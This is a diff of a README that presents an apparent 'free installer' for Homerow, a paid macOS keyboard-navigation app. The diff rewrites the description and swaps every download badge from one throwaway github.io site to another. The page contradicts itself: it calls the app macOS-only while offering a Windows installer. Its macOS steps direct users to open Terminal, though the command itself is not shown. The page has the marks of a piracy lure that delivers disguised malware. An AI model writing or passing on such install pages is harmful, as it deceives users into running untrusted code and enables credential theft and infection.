@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Keyboard+Navigation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Homerow Free Installer** — Homerow is a macOS productivity application that lets you navigate and control your Mac entirely using the keyboard, eliminating the need to switch between keyboard and mouse. Works without internet access, no account required. Full offline installation.
+**💻 Homerow Free Installer** — Homerow is a macOS utility that lets you navigate and interact with your entire Mac using only the keyboard, without reaching for the mouse. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Homerow
 
-Homerow is a macOS productivity application that lets you navigate and control your Mac entirely using the keyboard, eliminating the need to switch between keyboard and mouse. With a single shortcut, Homerow overlays letters on clickable interface elements, allowing you to click, focus, or scroll by typing the corresponding letters. It brings Vimium-style keyboard navigation to all macOS applications.
+Homerow is a macOS utility that lets you navigate and interact with your entire Mac using only the keyboard, without reaching for the mouse. By pressing a hotkey, every clickable element receives a letter code, allowing you to trigger any action by typing.
 
 ---
 
 ## ❌ Problem: Homerow is hard to access
 
-- **macOS Only** — No Windows version
-- **Learning Curve** — Keyboard-driven UI control requires building new muscle memory
-- **Application Compatibility** — Some applications with non-standard UI elements may have incomplete coverage
-- **Commercial License** — Paid application
+- **macOS Only** — No Windows or Linux equivalent
+- **Paid App** — Requires purchase from the developer website
+- **Learning Curve** — Adapting to keyboard-only navigation requires conscious habit change
+- **Compatibility** — Some apps with custom UI frameworks do not expose their elements to Homerow
 
 ---
 
@@ -61,9 +61,9 @@ Homerow is a macOS productivity application that lets you navigate and control y
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Homerow is a macOS productivity application that lets you navigate and control y
 
 <div align="center">
 
-[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Homerow is a macOS productivity application that lets you navigate and control y
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Homerow is a macOS productivity application that lets you navigate and control y
 
 ---
 
-**Homerow Free Installer** — Homerow is a macOS productivity application that lets you navigate and control your Mac entirely using the keyboard, eliminating the need to switch between keyboard and mouse. Install without internet connection today!
+**Homerow Free Installer** — Homerow is a macOS utility that lets you navigate and interact with your entire Mac using only the keyboard, without reaching for the mouse. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Homerow](https://img.shields.io/badge/⬇_Install_Homerow-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
